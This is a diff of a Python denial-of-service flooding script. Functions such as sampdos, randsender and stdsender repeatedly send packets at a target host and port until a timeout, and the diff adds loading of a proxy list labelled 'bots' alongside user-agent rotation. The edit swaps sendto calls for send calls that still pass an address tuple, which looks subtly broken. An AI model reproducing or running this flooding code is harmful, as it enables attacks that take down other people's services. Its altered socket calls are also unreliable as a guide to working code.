@@ -1,6 +1,7 @@
 import socket, struct, codecs, sys, threading, random, time, os, argparse
 
-
+proxys = open('proxy.txt').readlines()
+bots = len(proxys)
 Uams = open('ua.txt').readlines()
 uambot = len(Uams)
 
@@ -79,13 +80,13 @@ def sampdos(host, port, times):
 
                 msg = Attack[random.randrange(0,3)]
 
-                sock.sendto(pack, (host, int(port)))
+                sock.send(pack, (host, int(port)))
 
-                sock.sendto(packet, (host, int(port)))
+                sock.send(packet, (host, int(port)))
 
-                sock.sendto(msg, (host, int(port)))
+                sock.send(msg, (host, int(port)))
 
-                sock.sendto(packets, (host, int(port)))
+                sock.send(packets, (host, int(port)))
 
                 if int(port) == 443:
 
@@ -113,11 +114,11 @@ def randsender(host, port, times):
 
         while time.time() < timeout:
 
-                sock.sendto(punch, (host, int(port)))
+                sock.send(punch, (host, int(port)))
 
-                sock.sendto(punch, (host, int(port)))
+                sock.send(punch, (host, int(port)))
 
-                sock.sendto(punch, (host, int(port)))
+                sock.send(punch, (host, int(port)))
 
 
 
@@ -138,11 +139,11 @@ def stdsender(host, times):
 
         while time.time() < timeout:
 
-                sock.sendto(payload, (host, int(port)))
+                sock.send(payload, (host, int(port)))
 
-                sock.sendto(payload, (host, int(port)))
+                sock.send(payload, (host, int(port)))
 
-                sock.sendto(payload, (host, int(port)))
+                sock.send(payload, (host, int(port)))
 
 
 
